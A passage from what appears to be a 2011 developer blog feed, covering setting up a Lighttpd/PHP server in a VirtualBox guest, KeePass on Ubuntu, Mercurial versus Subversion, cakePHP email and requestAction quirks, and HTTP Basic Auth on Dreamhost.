&lt;p&gt;Now we will install php5 as CGI (Lighty will run php as cgi), as well as the
needed dependency so php can connect to both mysql and memcache.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;sudo apt-get install php5-cgi php5-memcache php5-mysql
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, you should now have everything correctly installed. We will configure all
that stuff later. You should now completely close your Virtual Machine and get
back to Windows. It&amp;#39;s time to configure your host and guest so they can
correctly communicate&lt;/p&gt;

&lt;h2&gt;Step 3 : Enabling communication between host and guest&lt;/h2&gt;

&lt;p&gt;What we will do in this section is configure your network so the guest machine
is considered part of your network and so you can connect to id using SSH and
classic http.&lt;/p&gt;

&lt;p&gt;First, go back to your VM config and change the Network mode to &amp;quot;Bridged&amp;quot;.
This will allow both machine to see each other in your network easily.&lt;/p&gt;

&lt;p&gt;Then, define the Shared folder you want shared from your host in your guest. I
shared my websites directories so Lighty could access them from the guest.&lt;/p&gt;

&lt;p&gt;Now, start your VM, and type &lt;code&gt;sudo ifconfig&lt;/code&gt; in a terminal. You should see
your guest machine ip. Mine was 192.168.1.16.&lt;/p&gt;

&lt;p&gt;Knowing that IP, you can define hosts in your Windows
&lt;code&gt;C:\Windows\System32\drivers\etc\hosts&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;You should also install openssh server so that you&amp;#39;ll be able to connect to
your guest machine using ssh :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;sudo apt-get install openssh-server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We will now take care of the shared folder defined earlier. Selecting them in
VirtualBox only made them available for mounting in the guest, but you&amp;#39;ll now
have to type some more commands to effectively see them. I needed to have
access to a project I coded in my host (let&amp;#39;s name it &lt;code&gt;myproject&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Here&amp;#39;s how I made it available to Lighty :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;sudo mkdir /var/www/myproject
sudo mount -t vboxsf -o rw,uid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;id -u&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;,gid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;id -g www-data&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt; myproject /var/www/myproject
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will create a directory in &lt;code&gt;/var/www&lt;/code&gt; to hold the project, and will then
mount the shared folder to that directory. The uid/gid stuff indicate that you
(the current user) is the owner and &lt;code&gt;www-data&lt;/code&gt; is the group. Doing so will fix
access rights issues you may have with Lighty.&lt;/p&gt;

&lt;p&gt;You should have to re-run the last command on every login, so I strongly
suggest you to put it in &lt;code&gt;/etc/rc.local&lt;/code&gt; so it gets executed automatically.&lt;/p&gt;

&lt;h2&gt;Step 4 : Configuring all that stuff&lt;/h2&gt;

&lt;p&gt;I won&amp;#39;t go into much details on how to configure lighty or php because it is
not the scope of this post. I might post on that subject later, though. But
here is one important step you shouldn&amp;#39;t forget : uncomment the
cgi.fix_pathinfo=1 line in your php.ini.&lt;/p&gt;

&lt;p&gt;Don&amp;#39;t forget to reload Lighty after changes to its config files by running:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;sudo /etc/init.d/lightppd restart
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I also had one additional side-effect on my install : installing php5 also
installed Apache, causing Lighty to fail on startup because Apache was already
using the port 80. I fixed it by removing every reference to Apache by running
:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;sudo update-rc.d -f apache2 remove
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Final note :&lt;/h2&gt;

&lt;p&gt;If you followed this instruction, you should have a server running inside a VM
that runs your website stored in your host. Isn&amp;#39;t that pretty ?&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Making Flash and Javascript speaks to each other</title>
   <link href="http://blog.pixelastic.com/2011/03/24/making-flash-javascript-speaks/"/>
   <updated>2011-03-24T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/03/24/making-flash-javascript-speaks</id>
   <content type="html">&lt;p&gt;I needed a Flash app and my Javascript code to be able to communicate. The
Flash needed to call some methods in the Javascript, and in turn the
Javascript needed to inject back some data into the Flash.&lt;/p&gt;

&lt;p&gt;I let my Flash coder colleague took care of the Flash side, he needed to
implement ExternalInterface, register some callbacks methods that I could call
and more importantly change some security settings to make it work.&lt;/p&gt;

&lt;p&gt;On my side, I just needed to get the &lt;code&gt;object&lt;/code&gt;element holding the Flash
(thanks to &lt;code&gt;swfobject.getObjectById&lt;/code&gt; it was pretty easy) and call the callback
method registered in Flash on it.&lt;/p&gt;

&lt;p&gt;Piece of cake.&lt;/p&gt;

&lt;p&gt;Have a look at this &lt;a href=&quot;http://circlecube.com/2010/12%0A/actionscript-as3-javascript-call-flash-to-and-from-javascript/&quot;&gt;blog post from CircleCube&lt;/a&gt;, it does a
pretty neat job at explaining all of that.&lt;/p&gt;

&lt;p&gt;Update :&lt;/p&gt;

&lt;p&gt;I finally had some issues with this implementation. It was working perfectly
on some servers but not on others. We finally found that calling
Security.allowDomain(&amp;#39;*.mainhost.com&amp;#39;) wasn&amp;#39;t working.&lt;/p&gt;

&lt;p&gt;You have to explicitly allow each domain/subdomain.&lt;/p&gt;

&lt;p&gt;As our code would be deployed on various duplicate domains, we had to manually
pass as a flash var the domain to allow.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Migrating from Windows to Ubuntu : KeePass</title>
   <link href="http://blog.pixelastic.com/2011/03/05/migrating-windows-ubuntu-keepassah/"/>
   <updated>2011-03-05T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/03/05/migrating-windows-ubuntu-keepassah</id>
   <content type="html">&lt;p&gt;I&amp;#39;m slowly trying to move my development machine from a desktop Windows Xp to
a laptop running Ubuntu. This is quite a long task because there are so much
softwares I depend on on my day to day work. Most of them are crossplatform
but I often need o find a Ubuntu equivalent, and sometimes it does not exists
and I have to run the Windows app using an emulator.&lt;/p&gt;

&lt;p&gt;This is exactly the case with &lt;a href=&quot;http://keepass.info/&quot;&gt;KeePass&lt;/a&gt;. KeePass 2.0 is
an improved version of KeePass 1.0 (obviously), that allows one to save all
password in one place. The 2.0 version also permit to save more than single
password, virtually anything, and adding little icons to each entry (when you
start having 200+ entries, icons are a must have).&lt;/p&gt;

&lt;h2&gt;Enter Ubuntu world&lt;/h2&gt;

&lt;p&gt;The official 2.0 version is not supported under linux. There is a linux port,
named &lt;a href=&quot;http://www.keepassx.org/&quot;&gt;KeePassX&lt;/a&gt;, but it does not support the
&lt;code&gt;.kdbx&lt;/code&gt; file format used by the official 2.0 version.&lt;/p&gt;

&lt;p&gt;So I tried to run the Windows &lt;code&gt;.exe&lt;/code&gt; file with Wine at first (I already had
Wine installed to run another app), but it wasn&amp;#39;t working with KeePass. I
tried instead an other emulator, Mono, and running &lt;code&gt;mono KeePass.exe&lt;/code&gt; totally
worked.&lt;/p&gt;

&lt;h2&gt;Little tweaks ahead&lt;/h2&gt;

&lt;p&gt;First of all, I had to install two additionnal packages to make it open
without errors : &lt;code&gt;System.Windows.Forms&lt;/code&gt; and &lt;code&gt;System.Runtime&lt;/code&gt;. So far, so good.&lt;/p&gt;

&lt;p&gt;But, I quickly discovered that one of the most usefull features of KeePass,
auto-type (Ctrl+V automatically fills a login/password field) wasn&amp;#39;t working
correctly. There was one more missing dependency : &lt;code&gt;xdotool&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;If you are running Ubuntu like me, do not install it from the official
packages, this version is completly outdated and won&amp;#39;t work. Instead, you have
to manually install the latest version. If you are lucky and running a 64bits
system, you can download directly &lt;a href=&quot;http://code.google%0A.com/p/semicomplete/downloads/list?can=2&amp;amp;q=label%3A.deb+label%3Axdotool+label%%0A3Afeatured&amp;amp;colspec=Filename+Summary+Uploaded+ReleaseDate+Size+DownloadCount&quot;&gt;the .deb file from here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;If you are running under a 32bits system like me, you&amp;#39;ll have to manually
install it. First grab &lt;a href=&quot;ttp://code.google.com/p/semicomplete/downloads/list?q=label:xdotool&quot;&gt;the files from this
link&lt;/a&gt;.
Then, install the &lt;code&gt;libxtst-dev&lt;/code&gt; package (it is needed for the install to
complete), export the content of the &lt;code&gt;.tar.gz&lt;/code&gt; file into a temporary directory
and execute &lt;code&gt;sudo make install&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;Finally !&lt;/h2&gt;

&lt;p&gt;Now, you got KeePass 2.0 working under Ubuntu, and installed all dependencies
needed to run the auto-type feature.&lt;/p&gt;

&lt;p&gt;In a Windows environment, one can change KeePass preferences so that closing
it only send it to the tray bar.This option does not seem to be working under
Linux, KeePass still shows in the task bar even when minimized. I spent some
time trying to fix that too, tetsing AllTray and other tray softs for linux
but didn&amp;#39;t managed to get what I wanted.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Differences between Mercurial and Subversion</title>
   <link href="http://blog.pixelastic.com/2011/02/23/differences-mercurial-subversion/"/>
   <updated>2011-02-23T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/02/23/differences-mercurial-subversion</id>
   <content type="html">&lt;p&gt;People at my current job are using Subversion, and our project will be tracked
using it. I never used Subversion before, the only versionning system I ever
used was Mercurial. And moving from one to the other meant changing a lot of
reflexs I had.&lt;/p&gt;

&lt;p&gt;Here is a little list of changes, mostly as a reminder for myself.&lt;/p&gt;

&lt;h2&gt;Directories&lt;/h2&gt;

&lt;p&gt;Mercurial uses a single &lt;code&gt;.hg&lt;/code&gt; directory at the root of your project to store
all your project history while Subversion adds multiple &lt;code&gt;.svn&lt;/code&gt; directories in
each directory, to track history changes to that directory only.&lt;/p&gt;

&lt;p&gt;I prefer the Mercurial approach, it keeps all changes centralized in one
place. You can simply remove the &lt;code&gt;.hg&lt;/code&gt; directory to transform your versionned
version into a stand-alone one.&lt;/p&gt;

&lt;p&gt;While the Subversion approach litters your app with countless hidden
directories, making copy and pasting a real pain.&lt;/p&gt;

&lt;h2&gt;Centralised vs Distributed&lt;/h2&gt;

&lt;p&gt;Subversion is centralised while Mercurial is distributed.&lt;/p&gt;

&lt;p&gt;As far as I understand the difference, it means that Subversion uses one main
directory to store the versionned version and can deploy (export) a specific
revision at anytime.&lt;/p&gt;

&lt;p&gt;That revision do not hold any history information, it is only a copy of your
project at a given time.&lt;/p&gt;

&lt;p&gt;On the other hand, each Mercurial repository holds both the current public
version and all the history. You do not have to deploy anything anywhere,
justÂ &lt;code&gt;update&lt;/code&gt; your current repo with data from one of the revision.&lt;/p&gt;

&lt;h2&gt;Tortoise&lt;/h2&gt;

&lt;p&gt;I am using both TortoiseSVN and TortoiseHg. When you commit with TortoiseSVN
it displays the list of files that where updated since the last commit. If you
added new files, they won&amp;#39;t show unless the &amp;quot;Show unversionned files&amp;quot; is
checked.&lt;/p&gt;

&lt;p&gt;In TortoiseHg, all new files are automatically seen in the commit window, as
well as a diff. It allows me the easily see what changes where made, and help
me write my commit message.&lt;/p&gt;

&lt;p&gt;I really like the TortoiseHg vision better.&lt;/p&gt;

&lt;h2&gt;Tracking directories&lt;/h2&gt;

&lt;p&gt;Subversion can track empty directory, just by adding them. Mercurial can&amp;#39;t.
You have to add an empty file in each to allow tracking.&lt;/p&gt;

&lt;p&gt;Also, when doing a commit in a specific directory in Mercurial, it will commit
the whole repo, while with Subversion it will only commit the current repo. I
can see the benefits of both and I&amp;#39;m not quite sure which is better.&lt;/p&gt;

&lt;p&gt;Subversion will allow me to do a commit of one special feature by committing
only one directory, but the TortoiseHg integration help me doing commits more
easily no matter where I&amp;#39;m browsing.&lt;/p&gt;

&lt;h2&gt;Ignoring files&lt;/h2&gt;

&lt;p&gt;I have some files in my project I don&amp;#39;t want to track (like auto-generated
cache files). In Mercurial, all I need is editing the &lt;code&gt;.hgignore&lt;/code&gt; file with
regexps. The syntax can be a little strange sometimes, it took me a while to
correcly understand it, but it definitely works.&lt;/p&gt;

&lt;p&gt;On Subversion, I can add files to the ignore list so they don&amp;#39;t show as
&amp;quot;unversionned&amp;quot;, but I can also add a &lt;code&gt;svn:ignore&lt;/code&gt;property to a specific
directory to set regexp to files that I don&amp;#39;t want to track. The end result is
the same, but the way Mercurial handle it with one file is more appealing to
me.&lt;/p&gt;

&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Having all history in one dir and all ignore rules in one files seems a better
approach to me. I guess on some aspects Mercurial is still more centralised
than Subversion.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>cakePHP wrapper for EmailComponent::send()</title>
   <link href="http://blog.pixelastic.com/2011/02/20/cakephp-wrapper-emailcomponent-send/"/>
   <updated>2011-02-20T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/02/20/cakephp-wrapper-emailcomponent-send</id>
   <content type="html">&lt;p&gt;As I already wrote in a &lt;a href=&quot;/blog/230:displaying-html-mails-sent-%0Afrom-cakephp-in-squirrelmail&quot;&gt;previous post&lt;/a&gt;, the cakePHP &lt;code&gt;EmailComponent&lt;/code&gt;seems to have some
quirks, forcing me to add more code to send an email.&lt;/p&gt;

&lt;p&gt;I stumbled upon one more issue today : a &lt;code&gt;View&lt;/code&gt; poisoning coming from the
&lt;code&gt;EmailComponent&lt;/code&gt;. Some vars I was passing to my view through the use of a
custom &lt;code&gt;Helper&lt;/code&gt;were wipe away if I send a mail in the same request.&lt;/p&gt;

&lt;p&gt;It took me some time to track it down, but I finally decided that I&amp;#39;ll now
wrap calls to &lt;code&gt;$this-&amp;gt;Email-&amp;gt;send()&lt;/code&gt; into a &lt;code&gt;__sendEmail()&lt;/code&gt; custom method
where I&amp;#39;ll add my tweaks.&lt;/p&gt;

&lt;p&gt;This will help migrating to a newer cake version easier when those bugs will
be fixed.&lt;/p&gt;

&lt;h2&gt;Easy debug&lt;/h2&gt;

&lt;p&gt;Debugging emails is not an easy task, but is greatly eased by cake. One can
set the delivery type to &lt;code&gt;debug&lt;/code&gt;and the mail will be generated like a normal
mail, but won&amp;#39;t be sent. Instead, its content will be saved in &lt;code&gt;Session&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;My wrapper will allow switching from normal to debug mail thanks to an
argument.&lt;/p&gt;

&lt;h2&gt;View cleaning&lt;/h2&gt;

&lt;p&gt;I&amp;#39;ll also clear the &lt;code&gt;ClassRegistry&lt;/code&gt;from the &lt;code&gt;View&lt;/code&gt;created by the
&lt;code&gt;EmailComponent&lt;/code&gt;. The &lt;code&gt;Email&lt;/code&gt;view is shared with the display view and this
can result in vars being lost or not correctly set. I think all those troubles
are gone in cake 2.0 but I haven&amp;#39;t tested it yet.&lt;/p&gt;

&lt;h2&gt;The __sendMail method&lt;/h2&gt;

&lt;p&gt;Here is the method code. You should add it to your AppController :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;function __sendMail($sendAsDebug = false) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  if (empty($this-&amp;gt;Email)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    return false;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Debug mode&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  if (!empty($sendAsDebug)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $this-&amp;gt;Email-&amp;gt;delivery = &amp;#39;debug&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // We force adding the boundaries and header otherwise some webmail (like SquirelMail) won&amp;#39;t correctly display them&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $this-&amp;gt;Email-&amp;gt;_createboundary();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $this-&amp;gt;Email-&amp;gt;__header[] = &amp;#39;MIME-Version: 1.0&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $this-&amp;gt;Email-&amp;gt;send();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // We display debug info&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  if (!empty($sendAsDebug)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    debug($this-&amp;gt;Session-&amp;gt;read(&amp;#39;Message.email.message&amp;#39;), true);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // We also need to clear the generated view so our display does not get poisoned by the Email display&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  ClassRegistry::removeObject(&amp;#39;view&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Getting raw JSON POST in PHP</title>
   <link href="http://blog.pixelastic.com/2011/02/03/raw-json-post-php/"/>
   <updated>2011-02-03T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/02/03/raw-json-post-php</id>
   <content type="html">&lt;p&gt;Sometimes you need to post raw &lt;code&gt;POST&lt;/code&gt;data without following the key/value
convention, like when you need to post to some webservices.&lt;/p&gt;

&lt;p&gt;Accessing it from PHP can be a little obsure at first, but all that is needed
is to read the input buffer by doing : &lt;code&gt;file_get_contents(&amp;quot;php://input&amp;quot;)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This can be useful when posting raw JSON without adding the overhead of all
the keys.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Malformed POST request made to an absolute url with Flash</title>
   <link href="http://blog.pixelastic.com/2011/02/02/malformed-post-request-absolute-url-flash/"/>
   <updated>2011-02-02T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/02/02/malformed-post-request-absolute-url-flash</id>
   <content type="html">&lt;p&gt;Sometimes you encounter bugs that smacks you in the face with their
strangeness. And even when you defeated them you still have this sour taste of
puzzlement.&lt;/p&gt;

&lt;p&gt;I encountered one of them today.&lt;/p&gt;

&lt;p&gt;While testing in a local environment and doing POST requests from Flash to a
distant cake app, I could get the request just fine.&lt;/p&gt;

&lt;p&gt;But when uploading the SWF on the server and embedding it in a Facebook App
Iframe, the POST data seemed corrupted and I couldn&amp;#39;t get it.&lt;/p&gt;

&lt;p&gt;Replacing the distant POST call to a local one (removing the whole &lt;code&gt;http://&lt;/code&gt;
part) fixed this strange bug.&lt;/p&gt;

&lt;p&gt;So we ended by adding a check to see if we were online or local and make an
absolute or relative call depending on the environment.&lt;/p&gt;

&lt;p&gt;So far, no more issues.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Going to parent folder in Windows 7 Explorer</title>
   <link href="http://blog.pixelastic.com/2011/01/21/parent-folder-windows-7-explorer/"/>
   <updated>2011-01-21T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/01/21/parent-folder-windows-7-explorer</id>
   <content type="html">&lt;p&gt;At first I thought I missed an option somewhere, but now I have to admit :
Microsoft removes the &amp;quot;Go to parent folder&amp;quot; button in the Windows 7 version of
Explorer.&lt;/p&gt;

&lt;p&gt;I like their new implementation of folder path, but a fast click to go up one
level, positionned in a consistent way in the UI is a plus.&lt;/p&gt;

&lt;p&gt;After some research I found the &lt;code&gt;Alt + Up&lt;/code&gt; keyboard shortcut to achieve the
same result, but while navigating through the explorer, I always am using my
mouse. Switching from mouse to keyboard is tedious, so I hunt for another
solution.&lt;/p&gt;

&lt;p&gt;I finally installed &lt;a href=&quot;http://sourceforge.net/projects/classicshell/&quot;&gt;ClassicShell
&lt;/a&gt;that adds the missing button
as well as some other minor cosmetics changes.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Protecting a directory using HTTP Auth on Dreamhost with cakePHP</title>
   <link href="http://blog.pixelastic.com/2011/01/20/protecting-directory-http-auth-dreamhost-cakephp/"/>
   <updated>2011-01-20T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/01/20/protecting-directory-http-auth-dreamhost-cakephp</id>
   <content type="html">&lt;p&gt;One can protect the browsing of a special directory with a simple set of
login/password by using appropriate &lt;code&gt;.htaccess&lt;/code&gt;/&lt;code&gt;.htpasswd&lt;/code&gt; files.&lt;/p&gt;

&lt;h2&gt;The classic way&lt;/h2&gt;

&lt;p&gt;Just create an &lt;code&gt;.htaccess&lt;/code&gt; in the directory you want to protect with the
following lines :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;nb&quot;&gt;AuthName&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Restricted Access&amp;quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;AuthType&lt;/span&gt; Basic
&lt;span class=&quot;nb&quot;&gt;AuthUserFile&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;/full/path/to/your/.htpasswd&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Limit&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;GET POST PUT&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;Require&lt;/span&gt; valid-user
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Limit&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And to create the .htpasswd file, run the following command :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;htpasswd -c /full/path/to/your/.htpasswd username
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;-c&lt;/code&gt; modifier will create the file, omit it if you only want to add a new
user. Also change the path to your &lt;code&gt;.htpasswd&lt;/code&gt; file (moving it out of the
webdir could be a good idea) and change &lt;code&gt;username&lt;/code&gt;to any login you want.&lt;/p&gt;

&lt;p&gt;You&amp;#39;ll then be prompted to enter the password (twice) and your file will be
generated.&lt;/p&gt;

&lt;h2&gt;cakePHP and Dreamhost fixed&lt;/h2&gt;

&lt;p&gt;I had an issue when protecting a folder in my &lt;code&gt;app/webroot/&lt;/code&gt;folder on
Dreamhost. I&amp;#39;m not sure it is completly cake related nor Dreamhost related but
the two together made it quite hard to debug.&lt;/p&gt;

&lt;p&gt;Anyway, it appears that when issuing an HTTP Auth, Dreamhost redirect to a
file named &lt;code&gt;/failed_auth.html&lt;/code&gt; (this is the file you&amp;#39;re supposed to see when
your Auth fails, obviously).&lt;/p&gt;

&lt;p&gt;But as I didn&amp;#39;t have such a file in my app, everytime I tried to access my
protected dir, I got my custom 404 error page.&lt;/p&gt;

&lt;p&gt;To finally fix that, all I had to do was to create a real &lt;code&gt;failed_auth.html&lt;/code&gt;
page, or in my case, create a Route that redirect &lt;code&gt;failed_auth.html&lt;/code&gt; to a
custom failed auth page.&lt;/p&gt;

&lt;p&gt;I guess just dropping a &lt;code&gt;failed_auth.html&lt;/code&gt; file in &lt;code&gt;app/webroot/&lt;/code&gt;could have
done the trick too.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Strange requestAction bug changing the page Content-Type</title>
   <link href="http://blog.pixelastic.com/2011/01/11/strange-requestaction-bug-changing-page-content-type/"/>
   <updated>2011-01-11T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/01/11/strange-requestaction-bug-changing-page-content-type</id>
   <content type="html">&lt;p&gt;Today, I thought my current project was finished. But I had this bug report in
my tracker from one of the beta-tester telling me that one of the page wasn&amp;#39;t
rendered properly.&lt;/p&gt;

&lt;p&gt;It says that the code source was displayed on screen instead of being rendered
as HTML. And only on Firefox.&lt;/p&gt;

&lt;p&gt;And if that wasn&amp;#39;t odd enough, even with the plethora of Firefox versions I
got, I couldn&amp;#39;t reproduce the bug on my side.&lt;/p&gt;

&lt;h2&gt;Turning off the debugger to debug&lt;/h2&gt;

&lt;p&gt;Then I had an idea. I turned off the debug mode, and was then able to
reproduce the infamous bug.&lt;/p&gt;

&lt;p&gt;As I initially supposed, there was something wrong with the &lt;code&gt;Content-Type&lt;/code&gt;
header. The Firebug Net Panel told me that it was set as &lt;code&gt;text/plain&lt;/code&gt; while
the developer toolbar insisted that it was &lt;code&gt;text/html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;After some digging in my own code, I found the culprit. A &lt;code&gt;requestAction()&lt;/code&gt;
call I made as part of an update process. This &lt;code&gt;requestAction&lt;/code&gt;was targeted at
a &lt;code&gt;.txt&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;I played a little with the debug value and found that for any value above 2,
everything was working correctly, but if I set my value below that threshold,
my whole view will get displayed as &lt;code&gt;text/plain&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I couldn&amp;#39;t quite explain why a debug value will have anything to with the view
rendering. I even disabled the Debug Kit component, just to be sure.&lt;/p&gt;

&lt;h2&gt;Digging into cake world&lt;/h2&gt;

&lt;p&gt;And then I decided to follow the dispatch trace to find where the debug value
was being used. After a long journey, I got to the &lt;code&gt;respondAs&lt;/code&gt;method of the
&lt;code&gt;RequestHandler&lt;/code&gt;component.&lt;/p&gt;

&lt;p&gt;And specifically, to that part :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;if (Configure::read() &amp;lt; 2 &amp;amp;&amp;amp; !defined(&amp;#39;CAKEPHP_SHELL&amp;#39;)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $this-&amp;gt;_header($header);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, so there was my debug value. Exactly the code reponsible for my symptoms.
Well, I still don&amp;#39;t understand WHY someone wanted to add an header based on
the debug value, but I could easily understand HOW it made my view that ugly.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;requestAction&lt;/code&gt;was being dispatched all along the way to its final
action, firing the &lt;code&gt;RequestHandler&lt;/code&gt;component on its way. Its extension being
&lt;code&gt;.txt&lt;/code&gt;, &lt;code&gt;RequestHandler&lt;/code&gt;will fire its &lt;code&gt;respondAs&lt;/code&gt; method and set the
appropriate header.&lt;/p&gt;

&lt;p&gt;Unfortunatly, setting such an header in a &lt;code&gt;requestAction&lt;/code&gt;wasn&amp;#39;t useful for
the request, and additionnaly, it was messing with the primary view dispatch
path.&lt;/p&gt;

&lt;h2&gt;Solution&lt;/h2&gt;

&lt;p&gt;I&lt;a href=&quot;http://cakephp.lighthouseapp.com/projects/42648-cakephp/tickets/1445%0A-requestaction-may-change-the-current-layout-depending-on-debug-value&quot;&gt; reported the
bug&lt;/a&gt; hoping
for a fix in a future version. For the time being, I manually set the debug to
2 before calling my &lt;code&gt;requestAction&lt;/code&gt;, and set it back to its previous value
after in my app.&lt;/p&gt;

&lt;p&gt;And for why it was only buggy on Firefox, it was caused by a double header
definition. A first header was telling &lt;code&gt;text/plain&lt;/code&gt; and a second one&lt;code&gt;
text/html&lt;/code&gt;. I guess Firefox uses the first one while other browsers the last.
This is what made Firebug and the Developer Toolbar return different results
too.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Apache rewrite_mod small tip</title>
   <link href="http://blog.pixelastic.com/2011/01/10/apache-rewrite-mod-small-tip/"/>
   <updated>2011-01-10T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/01/10/apache-rewrite-mod-small-tip</id>
   <content type="html">&lt;p&gt;Did you know that when debugging &lt;code&gt;RewriteRule&lt;/code&gt;s, instead of
commenting/uncommenting each line, you can simply make &lt;code&gt;RewriteEngine On&lt;/code&gt; /
&lt;code&gt;RewriteEngine Of&lt;/code&gt;f all along your code ?&lt;/p&gt;

&lt;p&gt;I didn&amp;#39;t, and now that I do it seems so obvious I don&amp;#39;t believe I&amp;#39;ve never
thought of that before...&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>IE8 ghost :after and :before pseudo elements</title>
   <link href="http://blog.pixelastic.com/2011/01/07/ie8-ghost-pseudo-elements/"/>
   <updated>2011-01-07T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/01/07/ie8-ghost-pseudo-elements</id>
   <content type="html">&lt;p&gt;IE8 has a strange bug (&lt;em&gt;what bugs aren&amp;#39;t strange in IE ?&lt;/em&gt;) when dealing with
&lt;code&gt;:after&lt;/code&gt; and &lt;code&gt;:before&lt;/code&gt; pseudo-elements.&lt;/p&gt;

